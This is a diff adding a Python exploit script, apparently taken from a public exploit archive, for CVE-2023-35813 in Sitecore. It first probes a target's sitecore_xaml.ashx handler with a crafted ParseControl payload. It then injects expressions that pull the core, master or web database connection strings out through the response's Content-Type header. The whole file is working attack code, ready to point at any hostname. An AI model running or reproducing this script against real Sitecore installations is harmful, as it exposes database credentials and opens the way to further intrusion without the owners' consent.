@@ -1,0 +1,110 @@
+id: 39439
+date: 03/11/2024
+title: Sitecore - Remote Code Execution v8.2 Exploit
+author: abhishek morla
+cves: CVE-2023-35813
+
+#!/usr/bin/env python3
+#
+# Exploit Title: Sitecore - Remote Code Execution v8.2 
+# Exploit Author: abhishek morla
+# Google Dork: N/A
+# Date: 2024-01-08
+# Vendor Homepage: https://www.sitecore.com/
+# Software Link: https://dev.sitecore.net/
+# Version: 10.3
+# Tested on: windows64bit / mozila firefox 
+# CVE : CVE-2023-35813
+# The vulnerability impacts all Experience Platform topologies (XM, XP, XC) from 9.0 Initial Release to 10.3 Initial Release; 8.2 is also impacted
+# Blog : https://medium.com/@abhishekmorla/uncovering-cve-2023-35813-retrieving-core-connection-strings-in-sitecore-5502148fce09
+# Video POC : https://youtu.be/vWKl9wgdTB0
+
+import argparse
+import requests
+from urllib.parse import quote
+from rich.console import Console
+
+console = Console()
+def initial_test(hostname):
+    # Initial payload to test vulnerability
+    test_payload = '''
+    <%@Register
+        TagPrefix = 'x'
+        Namespace = 'System.Runtime.Remoting.Services'
+        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    %>
+    <x:RemotingService runat='server'
+    Context-Response-ContentType='TestVulnerability'
+    />
+    '''
+    encoded_payload = quote(test_payload)
+
+    url = f"https://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = "__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\"{}\")".format(encoded_payload)
+
+    response = requests.post(url, headers=headers, data=data, verify=False)
+
+    # Check for the test string in the Content-Type of the response
+    return 'TestVulnerability' in response.headers.get('Content-Type', '')
+
+def get_payload(choice):
+    # Payload templates for different options
+    payloads = {
+        '1': "<%$ ConnectionStrings:core %>",
+        '2': "<%$ ConnectionStrings:master %>",
+        '3': "<%$ ConnectionStrings:web %>"
+    }
+
+    base_payload = '''
+    <%@Register
+        TagPrefix = 'x'
+        Namespace = 'System.Runtime.Remoting.Services'
+        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    %>
+    <x:RemotingService runat='server'
+    Context-Response-ContentType='{}'
+    />
+    '''
+
+    return base_payload.format(payloads.get(choice, "Invalid"))
+
+def main(hostname):
+    if initial_test(hostname):
+        print("Exploiting, Please wait...")
+        console.print("[bold green]The target appears to be vulnerable. Proceed with payload selection.[/bold green]")
+        print("Select the payload to use:")
+        print("1: Core connection strings")
+        print("2: Master connection strings")
+        print("3: Web connection strings")
+        payload_choice = input("Enter your choice (1, 2, or 3): ")
+
+        payload = get_payload(payload_choice)
+        encoded_payload = quote(payload)
+
+        url = f"http://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index"
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        data = "__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\"{}\")".format(encoded_payload)
+
+        response = requests.post(url, headers=headers, data=data)
+
+        if 'Content-Type' in response.headers:
+            print("Content-Type from the response header:")
+            print("\n")
+            print(response.headers['Content-Type'])
+        else:
+            print("No Content-Type in the response header. Status Code:", response.status_code)
+    else:
+        print("The target does not appear to be vulnerable to CVE-2023-35813.")
+
+
+if __name__ == "__main__":
+    console.print("[bold green]Author: Abhishek Morla[/bold green]")
+    console.print("[bold red]CVE-2023-35813[/bold red]")
+    parser = argparse.ArgumentParser(description='Test for CVE-2023-35813 vulnerability in Sitecore')
+    parser.add_argument('hostname', type=str, help='Hostname of the target Sitecore instance')
+    args = parser.parse_args()
+
+    main(args.hostname)
+
+#  0day.today [2024-03-15]  #
